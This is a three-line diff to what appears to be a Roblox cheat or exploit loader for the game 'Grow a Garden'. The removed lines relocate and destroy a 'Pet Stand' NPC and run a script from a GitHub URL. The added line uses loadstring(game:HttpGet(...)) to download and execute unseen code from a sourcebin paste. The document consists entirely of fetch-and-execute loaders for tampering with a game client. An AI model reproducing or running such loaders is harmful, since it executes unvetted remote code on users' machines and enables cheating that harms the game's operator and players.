@@ -1,3 +1,1 @@
-game:GetService("ReplicatedStorage").Modules.UpdateService.NewPetStand.Parent = workspace.NPCS
-workspace.NPCS["Pet Stand"]:Destroy()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/zanji-official/growagarden/refs/heads/main/script2", true))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WSc1lIBXO7/0", true))()
